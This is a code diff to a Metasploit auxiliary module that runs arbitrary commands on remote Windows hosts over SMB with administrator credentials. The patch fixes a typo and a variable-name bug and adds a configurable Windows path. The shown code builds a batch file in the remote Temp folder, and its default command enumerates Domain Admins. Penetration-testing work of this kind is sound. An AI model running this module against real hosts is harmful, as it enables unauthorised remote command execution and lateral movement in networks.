@@ -22,7 +22,7 @@ class Metasploit3 < Msf::Auxiliary
 			'Description'    => %q{
 					This module uses a valid administrator username and password to execute an
 				arbitrary command on one or more hosts, using a similar technique than the "psexec"
-				utility provided by SysInternals. Daisy chaining commands wiht '&' does not work
+				utility provided by SysInternals. Daisy chaining commands with '&' does not work
 				and users shouldn't try it. This module is useful because it doesn't need to upload
 				any binaries to the target machine.
 			},
@@ -45,6 +45,7 @@ class Metasploit3 < Msf::Auxiliary
 			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
 			OptString.new('COMMAND', [true, 'The command you want to execute on the remote host', 'net group "Domain Admins" /domain']),
 			OptString.new('RPORT', [true, 'The Target port', 445]),
+			OptString.new('WINPATH', [true, 'The name of the remote Windows directory', 'WINDOWS']),
 		], self.class)
 
 		deregister_options('RHOST')
@@ -56,7 +57,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	# This is the main controle method
 	def run_host(ip)
-		text = "\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
+		text = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
 		bat = "%WINDIR%\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
 		smbshare = datastore['SMBSHARE']
 
@@ -83,7 +84,7 @@ class Metasploit3 < Msf::Auxiliary
 			execute = "%COMSPEC% /C echo #{datastore['COMMAND']} ^> %SYSTEMDRIVE%#{text} > #{bat} & %COMSPEC% /C start cmd.exe /C #{bat}"
 			print_status("#{peer} - Executing the command...")
 			return psexec(execute)
-		rescue StandardError => exec_command_cerror
+		rescue StandardError => exec_command_error
 			print_error("#{peer} - Unable to execute specified command: #{exec_command_error}")
 			return false
 		end
